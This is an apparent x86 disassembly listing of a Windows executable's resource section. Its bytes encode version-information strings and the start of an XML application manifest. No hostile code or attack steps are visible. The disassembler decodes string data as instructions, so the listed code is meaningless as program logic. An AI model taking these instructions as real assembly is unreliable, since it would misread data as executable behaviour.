  40eb6c:	add    BYTE PTR [eax-0x67f00780],0x6f
  40eb73:	xor    eax,0x444150b4
  40eb78:	push   0x3404
  40eb7d:	add    BYTE PTR [esi+0x0],dl
  40eb80:	push   ebx
  40eb81:	add    BYTE PTR [edi+0x0],bl
  40eb84:	push   esi
  40eb85:	add    BYTE PTR [ebp+0x0],al
  40eb88:	push   edx
  40eb89:	add    BYTE PTR [ebx+0x0],dl
  40eb8c:	dec    ecx
  40eb8d:	add    BYTE PTR [edi+0x0],cl
  40eb90:	dec    esi
  40eb91:	add    BYTE PTR [edi+0x0],bl
  40eb94:	dec    ecx
  40eb95:	add    BYTE PTR [esi+0x0],cl
  40eb98:	inc    esi
  40eb99:	add    BYTE PTR [edi+0x0],cl
  40eb9c:	add    BYTE PTR [eax],al
  40eb9e:	add    BYTE PTR [eax],al
  40eba0:	mov    ebp,0xfeef04
  40eba5:	add    BYTE PTR [ecx],al
  40eba7:	add    BYTE PTR [eax],al
  40eba9:	add    BYTE PTR [ebx],cl
  40ebab:	add    BYTE PTR [ecx],al
  40ebad:	add    BYTE PTR [edi],ah
  40ebaf:	mov    BYTE PTR [eax],0x0
  40ebb2:	or     eax,DWORD PTR [eax]
  40ebb4:	add    DWORD PTR [eax],eax
  40ebb6:	daa    
  40ebb7:	(bad)  
  40ebb8:	aas    
  40ebb9:	add    BYTE PTR [eax],al
  40ebbb:	add    BYTE PTR [eax],al
  40ebbd:	add    BYTE PTR [eax],al
  40ebbf:	add    BYTE PTR [eax+eax*1],al
  40ebc2:	add    BYTE PTR [eax],al
  40ebc4:	add    DWORD PTR [eax],eax
	...
  40ebd2:	add    BYTE PTR [eax],al
  40ebd4:	inc    esp
  40ebd5:	add    BYTE PTR [eax],al
  40ebd7:	add    BYTE PTR [ecx],al
  40ebd9:	add    BYTE PTR [esi+0x0],dl
  40ebdc:	popa   
  40ebdd:	add    BYTE PTR [edx+0x0],dh
  40ebe0:	inc    esi
  40ebe1:	add    BYTE PTR [ecx+0x0],ch
  40ebe4:	ins    BYTE PTR es:[edi],dx
  40ebe5:	add    BYTE PTR [ebp+0x0],ah
  40ebe8:	dec    ecx
  40ebe9:	add    BYTE PTR [esi+0x0],ch
  40ebec:	data16 add BYTE PTR [edi+0x0],ch
  40ebf0:	add    BYTE PTR [eax],al
  40ebf2:	add    BYTE PTR [eax],al
  40ebf4:	and    al,0x0
  40ebf6:	add    al,0x0
  40ebf8:	add    BYTE PTR [eax],al
  40ebfa:	push   esp
  40ebfb:	add    BYTE PTR [edx+0x0],dh
  40ebfe:	popa   
  40ebff:	add    BYTE PTR [esi+0x0],ch
  40ec02:	jae    0x40ec04
  40ec04:	ins    BYTE PTR es:[edi],dx
  40ec05:	add    BYTE PTR [ecx+0x0],ah
  40ec08:	je     0x40ec0a
  40ec0a:	imul   eax,DWORD PTR [eax],0x6e006f
  40ec10:	add    BYTE PTR [eax],al
  40ec12:	add    BYTE PTR [eax],al
  40ec14:	add    BYTE PTR [eax],al
  40ec16:	mov    al,0x4
  40ec18:	enter  0x3,0x0
  40ec1c:	add    DWORD PTR [eax],eax
  40ec1e:	push   ebx
  40ec1f:	add    BYTE PTR [eax+eax*1+0x72],dh
  40ec23:	add    BYTE PTR [ecx+0x0],ch
  40ec26:	outs   dx,BYTE PTR ds:[esi]
  40ec27:	add    BYTE PTR [edi+0x0],ah
  40ec2a:	inc    esi
  40ec2b:	add    BYTE PTR [ecx+0x0],ch
  40ec2e:	ins    BYTE PTR es:[edi],dx
  40ec2f:	add    BYTE PTR [ebp+0x0],ah
  40ec32:	dec    ecx
  40ec33:	add    BYTE PTR [esi+0x0],ch
  40ec36:	data16 add BYTE PTR [edi+0x0],ch
  40ec3a:	add    BYTE PTR [eax],al
  40ec3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec3d:	add    eax,DWORD PTR [eax]
  40ec3f:	add    BYTE PTR [ecx],al
  40ec41:	add    BYTE PTR [eax],dh
  40ec43:	add    BYTE PTR [eax],dh
  40ec45:	add    BYTE PTR [eax],dh
  40ec47:	add    BYTE PTR [eax],dh
  40ec49:	add    BYTE PTR [eax],dh
  40ec4b:	add    BYTE PTR [eax+eax*1],dh
  40ec4e:	bound  eax,QWORD PTR [eax]
  40ec50:	xor    BYTE PTR [eax],al
  40ec52:	add    BYTE PTR [eax],al
  40ec54:	pusha  
  40ec55:	add    BYTE PTR [eax+eax*1],ah
  40ec58:	add    DWORD PTR [eax],eax
  40ec5a:	inc    ebx
  40ec5b:	add    BYTE PTR [edi+0x0],ch
  40ec5e:	ins    DWORD PTR es:[edi],dx
  40ec5f:	add    BYTE PTR [ebp+0x0],ch
  40ec62:	add    BYTE PTR gs:[esi+0x0],ch
  40ec66:	je     0x40ec68
  40ec68:	jae    0x40ec6a
  40ec6a:	add    BYTE PTR [eax],al
  40ec6c:	dec    ebp
  40ec6d:	add    BYTE PTR [ecx+0x0],ch
  40ec70:	arpl   WORD PTR [eax],ax
  40ec72:	jb     0x40ec74
  40ec74:	outs   dx,DWORD PTR ds:[esi]
  40ec75:	add    BYTE PTR [ebx+0x0],dh
  40ec78:	outs   dx,DWORD PTR ds:[esi]
  40ec79:	add    BYTE PTR [esi+0x0],ah
  40ec7c:	je     0x40ec7e
  40ec7e:	add    BYTE PTR cs:[esi+0x0],dl
  40ec82:	imul   eax,DWORD PTR [eax],0x750073
  40ec88:	popa   
  40ec89:	add    BYTE PTR [eax+eax*1+0x53],ch
  40ec8d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ec91:	add    BYTE PTR [eax+eax*1+0x69],ah
  40ec95:	add    BYTE PTR [edi+0x0],ch
  40ec98:	add    BYTE PTR cs:[edi+0x0],dl
  40ec9c:	add    BYTE PTR gs:[edx+0x0],ah
  40eca0:	add    BYTE PTR cs:[eax+0x0],cl
  40eca4:	outs   dx,DWORD PTR ds:[esi]
  40eca5:	add    BYTE PTR [ebx+0x0],dh
  40eca8:	je     0x40ecaa
  40ecaa:	add    BYTE PTR cs:[ebp+0x0],ah
  40ecae:	js     0x40ecb0
  40ecb0:	add    BYTE PTR gs:[eax],al
  40ecb3:	add    BYTE PTR [eax+eax*1+0x16],cl
  40ecb7:	add    BYTE PTR [ecx],al
  40ecb9:	add    BYTE PTR [ebx+0x0],al
  40ecbc:	outs   dx,DWORD PTR ds:[esi]
  40ecbd:	add    BYTE PTR [ebp+0x0],ch
  40ecc0:	jo     0x40ecc2
  40ecc2:	popa   
  40ecc3:	add    BYTE PTR [esi+0x0],ch
  40ecc6:	jns    0x40ecc8
  40ecc8:	dec    esi
  40ecc9:	add    BYTE PTR [ecx+0x0],ah
  40eccc:	ins    DWORD PTR es:[edi],dx
  40eccd:	add    BYTE PTR [ebp+0x0],ah
  40ecd0:	add    BYTE PTR [eax],al
  40ecd2:	add    BYTE PTR [eax],al
  40ecd4:	dec    ebp
  40ecd5:	add    BYTE PTR [ecx+0x0],ch
  40ecd8:	arpl   WORD PTR [eax],ax
  40ecda:	jb     0x40ecdc
  40ecdc:	outs   dx,DWORD PTR ds:[esi]
  40ecdd:	add    BYTE PTR [ebx+0x0],dh
  40ece0:	outs   dx,DWORD PTR ds:[esi]
  40ece1:	add    BYTE PTR [esi+0x0],ah
  40ece4:	je     0x40ece6
  40ece6:	and    BYTE PTR [eax],al
  40ece8:	inc    ebx
  40ece9:	add    BYTE PTR [edi+0x0],ch
  40ecec:	jb     0x40ecee
  40ecee:	jo     0x40ecf0
  40ecf0:	outs   dx,DWORD PTR ds:[esi]
  40ecf1:	add    BYTE PTR [edx+0x0],dh
  40ecf4:	popa   
  40ecf5:	add    BYTE PTR [eax+eax*1+0x69],dh
  40ecf9:	add    BYTE PTR [edi+0x0],ch
  40ecfc:	outs   dx,BYTE PTR ds:[esi]
  40ecfd:	add    BYTE PTR [eax],al
  40ecff:	add    BYTE PTR [eax+0x0],dh
  40ed02:	and    al,0x0
  40ed04:	add    DWORD PTR [eax],eax
  40ed06:	inc    esi
  40ed07:	add    BYTE PTR [ecx+0x0],ch
  40ed0a:	ins    BYTE PTR es:[edi],dx
  40ed0b:	add    BYTE PTR [ebp+0x0],ah
  40ed0e:	inc    esp
  40ed0f:	add    BYTE PTR [ebp+0x0],ah
  40ed12:	jae    0x40ed14
  40ed14:	arpl   WORD PTR [eax],ax
  40ed16:	jb     0x40ed18
  40ed18:	imul   eax,DWORD PTR [eax],0x740070
  40ed1e:	imul   eax,DWORD PTR [eax],0x6e006f
  40ed24:	add    BYTE PTR [eax],al
  40ed26:	add    BYTE PTR [eax],al
  40ed28:	dec    ebp
  40ed29:	add    BYTE PTR [ecx+0x0],ch
  40ed2c:	arpl   WORD PTR [eax],ax
  40ed2e:	jb     0x40ed30
  40ed30:	outs   dx,DWORD PTR ds:[esi]
  40ed31:	add    BYTE PTR [ebx+0x0],dh
  40ed34:	outs   dx,DWORD PTR ds:[esi]
  40ed35:	add    BYTE PTR [esi+0x0],ah
  40ed38:	je     0x40ed3a
  40ed3a:	add    BYTE PTR cs:[esi+0x0],dl
  40ed3e:	imul   eax,DWORD PTR [eax],0x750073
  40ed44:	popa   
  40ed45:	add    BYTE PTR [eax+eax*1+0x53],ch
  40ed49:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ed4d:	add    BYTE PTR [eax+eax*1+0x69],ah
  40ed51:	add    BYTE PTR [edi+0x0],ch
  40ed54:	add    BYTE PTR cs:[edi+0x0],dl
  40ed58:	add    BYTE PTR gs:[edx+0x0],ah
  40ed5c:	add    BYTE PTR cs:[eax+0x0],cl
  40ed60:	outs   dx,DWORD PTR ds:[esi]
  40ed61:	add    BYTE PTR [ebx+0x0],dh
  40ed64:	je     0x40ed66
  40ed66:	add    BYTE PTR cs:[ebp+0x0],ah
  40ed6a:	js     0x40ed6c
  40ed6c:	add    BYTE PTR gs:[eax],al
  40ed6f:	add    BYTE PTR [eax+eax*1],bh
  40ed72:	or     eax,0x46000100
  40ed77:	add    BYTE PTR [ecx+0x0],ch
  40ed7a:	ins    BYTE PTR es:[edi],dx
  40ed7b:	add    BYTE PTR [ebp+0x0],ah
  40ed7e:	push   esi
  40ed7f:	add    BYTE PTR [ebp+0x0],ah
  40ed82:	jb     0x40ed84
  40ed84:	jae    0x40ed86
  40ed86:	imul   eax,DWORD PTR [eax],0x6e006f
  40ed8c:	add    BYTE PTR [eax],al
  40ed8e:	add    BYTE PTR [eax],al
  40ed90:	xor    DWORD PTR [eax],eax
  40ed92:	xor    DWORD PTR [eax],eax
  40ed94:	add    BYTE PTR cs:[eax],dh
  40ed97:	add    BYTE PTR [esi],ch
  40ed99:	add    BYTE PTR ds:0x37003000,dh
  40ed9f:	add    BYTE PTR [edx],dh
  40eda1:	add    BYTE PTR [edi],dh
  40eda3:	add    BYTE PTR [esi],ch
  40eda5:	add    BYTE PTR [ecx],dh
  40eda7:	add    BYTE PTR [eax],al
  40eda9:	add    BYTE PTR [eax],al
  40edab:	add    BYTE PTR [eax+0x0],ch
  40edae:	and    al,0x0
  40edb0:	add    DWORD PTR [eax],eax
  40edb2:	dec    ecx
  40edb3:	add    BYTE PTR [esi+0x0],ch
  40edb6:	je     0x40edb8
  40edb8:	add    BYTE PTR gs:[edx+0x0],dh
  40edbc:	outs   dx,BYTE PTR ds:[esi]
  40edbd:	add    BYTE PTR [ecx+0x0],ah
  40edc0:	ins    BYTE PTR es:[edi],dx
  40edc1:	add    BYTE PTR [esi+0x0],cl
  40edc4:	popa   
  40edc5:	add    BYTE PTR [ebp+0x0],ch
  40edc8:	add    BYTE PTR gs:[eax],al
  40edcb:	add    BYTE PTR [ebp+0x0],cl
  40edce:	imul   eax,DWORD PTR [eax],0x720063
  40edd4:	outs   dx,DWORD PTR ds:[esi]
  40edd5:	add    BYTE PTR [ebx+0x0],dh
  40edd8:	outs   dx,DWORD PTR ds:[esi]
  40edd9:	add    BYTE PTR [esi+0x0],ah
  40eddc:	je     0x40edde
  40edde:	add    BYTE PTR cs:[esi+0x0],dl
  40ede2:	imul   eax,DWORD PTR [eax],0x750073
  40ede8:	popa   
  40ede9:	add    BYTE PTR [eax+eax*1+0x53],ch
  40eded:	add    BYTE PTR [eax+eax*1+0x75],dh
  40edf1:	add    BYTE PTR [eax+eax*1+0x69],ah
  40edf5:	add    BYTE PTR [edi+0x0],ch
  40edf8:	add    BYTE PTR cs:[edi+0x0],dl
  40edfc:	add    BYTE PTR gs:[edx+0x0],ah
  40ee00:	add    BYTE PTR cs:[eax+0x0],cl
  40ee04:	outs   dx,DWORD PTR ds:[esi]
  40ee05:	add    BYTE PTR [ebx+0x0],dh
  40ee08:	je     0x40ee0a
  40ee0a:	add    BYTE PTR cs:[ebp+0x0],ah
  40ee0e:	js     0x40ee10
  40ee10:	add    BYTE PTR gs:[eax],al
  40ee13:	add    BYTE PTR [eax+0x1002e00],al
  40ee19:	add    BYTE PTR [eax+eax*1+0x65],cl
  40ee1d:	add    BYTE PTR [edi+0x0],ah
  40ee20:	popa   
  40ee21:	add    BYTE PTR [eax+eax*1+0x43],ch
  40ee25:	add    BYTE PTR [edi+0x0],ch
  40ee28:	jo     0x40ee2a
  40ee2a:	jns    0x40ee2c
  40ee2c:	jb     0x40ee2e
  40ee2e:	imul   eax,DWORD PTR [eax],0x680067
  40ee34:	je     0x40ee36
  40ee36:	add    BYTE PTR [eax],al
  40ee38:	test   eax,0x4d002000
  40ee3d:	add    BYTE PTR [ecx+0x0],ch
  40ee40:	arpl   WORD PTR [eax],ax
  40ee42:	jb     0x40ee44
  40ee44:	outs   dx,DWORD PTR ds:[esi]
  40ee45:	add    BYTE PTR [ebx+0x0],dh
  40ee48:	outs   dx,DWORD PTR ds:[esi]
  40ee49:	add    BYTE PTR [esi+0x0],ah
  40ee4c:	je     0x40ee4e
  40ee4e:	and    BYTE PTR [eax],al
  40ee50:	inc    ebx
  40ee51:	add    BYTE PTR [edi+0x0],ch
  40ee54:	jb     0x40ee56
  40ee56:	jo     0x40ee58
  40ee58:	outs   dx,DWORD PTR ds:[esi]
  40ee59:	add    BYTE PTR [edx+0x0],dh
  40ee5c:	popa   
  40ee5d:	add    BYTE PTR [eax+eax*1+0x69],dh
  40ee61:	add    BYTE PTR [edi+0x0],ch
  40ee64:	outs   dx,BYTE PTR ds:[esi]
  40ee65:	add    BYTE PTR [esi],ch
  40ee67:	add    BYTE PTR [eax],ah
  40ee69:	add    BYTE PTR [ecx+0x0],al
  40ee6c:	ins    BYTE PTR es:[edi],dx
  40ee6d:	add    BYTE PTR [eax+eax*1+0x20],ch
  40ee71:	add    BYTE PTR [edx+0x0],dh
  40ee74:	imul   eax,DWORD PTR [eax],0x680067
  40ee7a:	je     0x40ee7c
  40ee7c:	jae    0x40ee7e
  40ee7e:	and    BYTE PTR [eax],al
  40ee80:	jb     0x40ee82
  40ee82:	add    BYTE PTR gs:[ebx+0x0],dh
  40ee86:	add    BYTE PTR gs:[edx+0x0],dh
  40ee8a:	jbe    0x40ee8c
  40ee8c:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40ee91:	add    BYTE PTR [eax],al
  40ee93:	add    BYTE PTR [eax+0x0],dh
  40ee96:	and    al,0x0
  40ee98:	add    DWORD PTR [eax],eax
  40ee9a:	dec    edi
  40ee9b:	add    BYTE PTR [edx+0x0],dh
  40ee9e:	imul   eax,DWORD PTR [eax],0x690067
  40eea4:	outs   dx,BYTE PTR ds:[esi]
  40eea5:	add    BYTE PTR [ecx+0x0],ah
  40eea8:	ins    BYTE PTR es:[edi],dx
  40eea9:	add    BYTE PTR [esi+0x0],al
  40eeac:	imul   eax,DWORD PTR [eax],0x65006c
  40eeb2:	outs   dx,BYTE PTR ds:[esi]
  40eeb3:	add    BYTE PTR [ecx+0x0],ah
  40eeb6:	ins    DWORD PTR es:[edi],dx
  40eeb7:	add    BYTE PTR [ebp+0x0],ah
  40eeba:	add    BYTE PTR [eax],al
  40eebc:	dec    ebp
  40eebd:	add    BYTE PTR [ecx+0x0],ch
  40eec0:	arpl   WORD PTR [eax],ax
  40eec2:	jb     0x40eec4
  40eec4:	outs   dx,DWORD PTR ds:[esi]
  40eec5:	add    BYTE PTR [ebx+0x0],dh
  40eec8:	outs   dx,DWORD PTR ds:[esi]
  40eec9:	add    BYTE PTR [esi+0x0],ah
  40eecc:	je     0x40eece
  40eece:	add    BYTE PTR cs:[esi+0x0],dl
  40eed2:	imul   eax,DWORD PTR [eax],0x750073
  40eed8:	popa   
  40eed9:	add    BYTE PTR [eax+eax*1+0x53],ch
  40eedd:	add    BYTE PTR [eax+eax*1+0x75],dh
  40eee1:	add    BYTE PTR [eax+eax*1+0x69],ah
  40eee5:	add    BYTE PTR [edi+0x0],ch
  40eee8:	add    BYTE PTR cs:[edi+0x0],dl
  40eeec:	add    BYTE PTR gs:[edx+0x0],ah
  40eef0:	add    BYTE PTR cs:[eax+0x0],cl
  40eef4:	outs   dx,DWORD PTR ds:[esi]
  40eef5:	add    BYTE PTR [ebx+0x0],dh
  40eef8:	je     0x40eefa
  40eefa:	add    BYTE PTR cs:[ebp+0x0],ah
  40eefe:	js     0x40ef00
  40ef00:	add    BYTE PTR gs:[eax],al
  40ef03:	add    BYTE PTR [eax+0x0],ah
  40ef06:	pop    ds
  40ef07:	add    BYTE PTR [ecx],al
  40ef09:	add    BYTE PTR [eax+0x0],dl
  40ef0c:	jb     0x40ef0e
  40ef0e:	outs   dx,DWORD PTR ds:[esi]
  40ef0f:	add    BYTE PTR [eax+eax*1+0x75],ah
  40ef13:	add    BYTE PTR [ebx+0x0],ah
  40ef16:	je     0x40ef18
  40ef18:	dec    esi
  40ef19:	add    BYTE PTR [ecx+0x0],ah
  40ef1c:	ins    DWORD PTR es:[edi],dx
  40ef1d:	add    BYTE PTR [ebp+0x0],ah
  40ef20:	add    BYTE PTR [eax],al
  40ef22:	add    BYTE PTR [eax],al
  40ef24:	dec    ebp
  40ef25:	add    BYTE PTR [ecx+0x0],ch
  40ef28:	arpl   WORD PTR [eax],ax
  40ef2a:	jb     0x40ef2c
  40ef2c:	outs   dx,DWORD PTR ds:[esi]
  40ef2d:	add    BYTE PTR [ebx+0x0],dh
  40ef30:	outs   dx,DWORD PTR ds:[esi]
  40ef31:	add    BYTE PTR [esi+0x0],ah
  40ef34:	je     0x40ef36
  40ef36:	scas   al,BYTE PTR es:[edi]
  40ef37:	add    BYTE PTR [eax],ah
  40ef39:	add    BYTE PTR [esi+0x0],dl
  40ef3c:	imul   eax,DWORD PTR [eax],0x750073
  40ef42:	popa   
  40ef43:	add    BYTE PTR [eax+eax*1+0x20],ch
  40ef47:	add    BYTE PTR [ebx+0x0],dl
  40ef4a:	je     0x40ef4c
  40ef4c:	jne    0x40ef4e
  40ef4e:	add    BYTE PTR fs:[ecx+0x0],ch
  40ef52:	outs   dx,DWORD PTR ds:[esi]
  40ef53:	add    BYTE PTR [esi+0x32002000],ch
  40ef59:	add    BYTE PTR [eax],dh
  40ef5b:	add    BYTE PTR [ecx],dh
  40ef5d:	add    BYTE PTR [edx],dh
  40ef5f:	add    BYTE PTR [eax],al
  40ef61:	add    BYTE PTR [eax],al
  40ef63:	add    BYTE PTR [eax+0x0],al
  40ef66:	or     eax,0x50000100
  40ef6b:	add    BYTE PTR [edx+0x0],dh
  40ef6e:	outs   dx,DWORD PTR ds:[esi]
  40ef6f:	add    BYTE PTR [eax+eax*1+0x75],ah
  40ef73:	add    BYTE PTR [ebx+0x0],ah
  40ef76:	je     0x40ef78
  40ef78:	push   esi
  40ef79:	add    BYTE PTR [ebp+0x0],ah
  40ef7c:	jb     0x40ef7e
  40ef7e:	jae    0x40ef80
  40ef80:	imul   eax,DWORD PTR [eax],0x6e006f
  40ef86:	add    BYTE PTR [eax],al
  40ef88:	xor    DWORD PTR [eax],eax
  40ef8a:	xor    DWORD PTR [eax],eax
  40ef8c:	add    BYTE PTR cs:[eax],dh
  40ef8f:	add    BYTE PTR [esi],ch
  40ef91:	add    BYTE PTR ds:0x37003000,dh
  40ef97:	add    BYTE PTR [edx],dh
  40ef99:	add    BYTE PTR [edi],dh
  40ef9b:	add    BYTE PTR [esi],ch
  40ef9d:	add    BYTE PTR [ecx],dh
  40ef9f:	add    BYTE PTR [eax],al
  40efa1:	add    BYTE PTR [eax],al
  40efa3:	add    BYTE PTR [eax+eax*1],bh
  40efa6:	or     DWORD PTR [eax],eax
  40efa8:	add    DWORD PTR [eax],eax
  40efaa:	inc    ecx
  40efab:	add    BYTE PTR [ebx+0x0],dh
  40efae:	jae    0x40efb0
  40efb0:	add    BYTE PTR gs:[ebp+0x0],ch
  40efb4:	bound  eax,QWORD PTR [eax]
  40efb6:	ins    BYTE PTR es:[edi],dx
  40efb7:	add    BYTE PTR [ecx+0x0],bh
  40efba:	and    BYTE PTR [eax],al
  40efbc:	push   esi
  40efbd:	add    BYTE PTR [ebp+0x0],ah
  40efc0:	jb     0x40efc2
  40efc2:	jae    0x40efc4
  40efc4:	imul   eax,DWORD PTR [eax],0x6e006f
  40efca:	add    BYTE PTR [eax],al
  40efcc:	xor    DWORD PTR [eax],eax
  40efce:	xor    DWORD PTR [eax],eax
  40efd0:	add    BYTE PTR cs:[eax],dh
  40efd3:	add    BYTE PTR [esi],ch
  40efd5:	add    BYTE PTR [eax],dh
  40efd7:	add    BYTE PTR [esi],ch
  40efd9:	add    BYTE PTR [eax],dh
  40efdb:	add    BYTE PTR [eax],al
  40efdd:	add    BYTE PTR [eax],al
  40efdf:	add    bh,ch
  40efe1:	mov    ebx,0x783f3cbf
  40efe6:	ins    DWORD PTR es:[edi],dx
  40efe7:	ins    BYTE PTR es:[edi],dx
  40efe8:	and    BYTE PTR [esi+0x65],dh
  40efeb:	jb     0x40f060
  40efed:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40eff4:	xor    BYTE PTR [edx],ah
  40eff6:	and    BYTE PTR [ebp+0x6e],ah
  40eff9:	arpl   WORD PTR [edi+0x64],bp
  40effc:	imul   ebp,DWORD PTR [esi+0x67],0x7475223d
  40f003:	sub    ax,0x2238
  40f007:	aas    
  40f008:	ds or  eax,0x73613c0a
  40f00e:	ins    DWORD PTR es:[edi],dx
  40f00f:	jbe    0x40f042
  40f011:	cmp    ah,BYTE PTR [ecx+0x73]
  40f014:	jae    0x40f07b
  40f016:	ins    DWORD PTR es:[edi],dx
  40f017:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40f01b:	ins    DWORD PTR es:[edi],dx
  40f01c:	popa   
  40f01d:	outs   dx,BYTE PTR ds:[esi]
  40f01e:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40f025:	jb     0x40f09a
  40f027:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40f02e:	xor    BYTE PTR [edx],ah
  40f030:	and    BYTE PTR [eax+0x6d],bh
  40f033:	ins    BYTE PTR es:[edi],dx
  40f034:	outs   dx,BYTE PTR ds:[esi]
  40f035:	jae    0x40f074
  40f037:	and    dh,BYTE PTR [ebp+0x72]
  40f03a:	outs   dx,BYTE PTR ds:[esi]
  40f03b:	cmp    dh,BYTE PTR [ebx+0x63]
  40f03e:	push   0x73616d65
  40f043:	sub    eax,0x7263696d
  40f048:	outs   dx,DWORD PTR ds:[esi]
  40f049:	jae    0x40f0ba
  40f04b:	data16 je 0x40f07b
  40f04e:	arpl   WORD PTR [edi+0x6d],bp
  40f051:	cmp    ah,BYTE PTR [ecx+0x73]
  40f054:	ins    DWORD PTR es:[edi],dx
  40f055:	cs jbe 0x40f089
  40f058:	and    ah,BYTE PTR [eax]
  40f05a:	js     0x40f0c9
  40f05c:	ins    BYTE PTR es:[edi],dx
  40f05d:	outs   dx,BYTE PTR ds:[esi]
  40f05e:	jae    0x40f09a
  40f060:	popa   
  40f061:	jae    0x40f0d0
  40f063:	jbe    0x40f096
  40f065:	cmp    eax,0x6e727522
  40f06a:	cmp    dh,BYTE PTR [ebx+0x63]
  40f06d:	push   0x73616d65
  40f072:	sub    eax,0x7263696d
  40f077:	outs   dx,DWORD PTR ds:[esi]
  40f078:	jae    0x40f0e9
  40f07a:	data16 je 0x40f0aa
  40f07d:	arpl   WORD PTR [edi+0x6d],bp
  40f080:	cmp    ah,BYTE PTR [ecx+0x73]
  40f083:	ins    DWORD PTR es:[edi],dx
  40f084:	cs jbe 0x40f0b8
  40f087:	and    ah,BYTE PTR [eax]
  40f089:	js     0x40f0f8
  40f08b:	ins    BYTE PTR es:[edi],dx
  40f08c:	outs   dx,BYTE PTR ds:[esi]
  40f08d:	jae    0x40f0c9
  40f08f:	popa   
  40f090:	jae    0x40f0ff
  40f092:	jbe    0x40f0c6
  40f094:	cmp    eax,0x6e727522
  40f099:	cmp    dh,BYTE PTR [ebx+0x63]
  40f09c:	push   0x73616d65
  40f0a1:	sub    eax,0x7263696d
  40f0a6:	outs   dx,DWORD PTR ds:[esi]
  40f0a7:	jae    0x40f118
  40f0a9:	data16 je 0x40f0d9
  40f0ac:	arpl   WORD PTR [edi+0x6d],bp
  40f0af:	cmp    ah,BYTE PTR [ecx+0x73]
  40f0b2:	ins    DWORD PTR es:[edi],dx
  40f0b3:	cs jbe 0x40f0e8
  40f0b6:	and    ah,BYTE PTR [eax]
  40f0b8:	js     0x40f127
  40f0ba:	ins    BYTE PTR es:[edi],dx
  40f0bb:	outs   dx,BYTE PTR ds:[esi]
  40f0bc:	jae    0x40f0f8
  40f0be:	js     0x40f133
  40f0c0:	imul   edi,DWORD PTR ds:0x74746822,0x2f2f3a70
  40f0ca:	ja     0x40f143
  40f0cc:	ja     0x40f0fc
  40f0ce:	ja     0x40f103
  40f0d0:	outs   dx,DWORD PTR cs:[esi]
  40f0d2:	jb     0x40f13b
  40f0d4:	das    
  40f0d5:	xor    dh,BYTE PTR [eax]
  40f0d7:	xor    BYTE PTR [ecx],dh
  40f0d9:	das    
  40f0da:	pop    eax
  40f0db:	dec    ebp
  40f0dc:	dec    esp
  40f0dd:	push   ebx
  40f0de:	arpl   WORD PTR [eax+0x65],bp
  40f0e1:	ins    DWORD PTR es:[edi],dx
  40f0e2:	popa   
  40f0e3:	sub    eax,0x74736e69
  40f0e8:	popa   
  40f0e9:	outs   dx,BYTE PTR ds:[esi]
  40f0ea:	arpl   WORD PTR [ebp+0x22],sp
  40f0ed:	ds or  eax,0x3c20200a
  40f0f3:	popa   
  40f0f4:	jae    0x40f169
  40f0f6:	gs ins DWORD PTR es:[edi],dx
  40f0f8:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40f0fc:	fs outs dx,BYTE PTR gs:[esi]
  40f0ff:	je     0x40f16a
  40f101:	je     0x40f17c
  40f103:	and    BYTE PTR [esi+0x65],dh
  40f106:	jb     0x40f17b
  40f108:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40f10f:	xor    BYTE PTR [esi],ch
  40f111:	xor    BYTE PTR [esi],ch
  40f113:	xor    BYTE PTR [edx],ah
  40f115:	and    BYTE PTR [esi+0x61],ch
  40f118:	ins    DWORD PTR es:[edi],dx
  40f119:	gs cmp eax,0x63694d22
  40f11f:	jb     0x40f190
  40f121:	jae    0x40f192
  40f123:	data16 je 0x40f154
  40f126:	push   esi
  40f127:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40f12e:	jne    0x40f194
  40f130:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  40f137:	dec    eax
  40f138:	outs   dx,DWORD PTR ds:[esi]
  40f139:	jae    0x40f1af
  40f13b:	push   eax
  40f13c:	jb     0x40f1ad
  40f13e:	arpl   WORD PTR [ebp+0x73],sp
  40f141:	jae    0x40f171
  40f143:	popa   
  40f144:	jo     0x40f1b6
  40f146:	and    ch,BYTE PTR [edi]
  40f148:	ds or  eax,0x3c20200a
  40f14e:	je     0x40f1c2
  40f150:	jne    0x40f1c5
  40f152:	je     0x40f19d
  40f154:	outs   dx,BYTE PTR ds:[esi]
  40f155:	outs   dx,WORD PTR ds:[esi]
  40f157:	and    BYTE PTR [eax+0x6d],bh
  40f15a:	ins    BYTE PTR es:[edi],dx
  40f15b:	outs   dx,BYTE PTR ds:[esi]
  40f15c:	jae    0x40f19b
  40f15e:	and    dh,BYTE PTR [ebp+0x72]
  40f161:	outs   dx,BYTE PTR ds:[esi]
  40f162:	cmp    dh,BYTE PTR [ebx+0x63]
  40f165:	push   0x73616d65
  40f16a:	sub    eax,0x7263696d
  40f16f:	outs   dx,DWORD PTR ds:[esi]
  40f170:	jae    0x40f1e1
  40f172:	data16 je 0x40f1a2
  40f175:	arpl   WORD PTR [edi+0x6d],bp
  40f178:	cmp    ah,BYTE PTR [ecx+0x73]
  40f17b:	ins    DWORD PTR es:[edi],dx
  40f17c:	cs jbe 0x40f1b1
  40f17f:	and    bh,BYTE PTR [esi]
  40f181:	or     eax,0x2020200a
  40f186:	and    BYTE PTR [ebx+esi*2],bh
  40f189:	arpl   WORD PTR gs:[ebp+0x72],si
  40f18d:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40f195:	and    BYTE PTR [eax],ah
  40f197:	and    BYTE PTR [eax],ah
  40f199:	cmp    al,0x72
  40f19b:	gs jno 0x40f213
  40f19e:	gs jae 0x40f215
  40f1a1:	gs fs push eax
  40f1a4:	jb     0x40f20f
  40f1a6:	jbe    0x40f211
  40f1a8:	ins    BYTE PTR es:[edi],dx
  40f1a9:	gs addr16 gs jae 0x40f1ce
  40f1ae:	js     0x40f21d
  40f1b0:	ins    BYTE PTR es:[edi],dx
  40f1b1:	outs   dx,BYTE PTR ds:[esi]
  40f1b2:	jae    0x40f1f1
  40f1b4:	and    dh,BYTE PTR [ebp+0x72]
  40f1b7:	outs   dx,BYTE PTR ds:[esi]
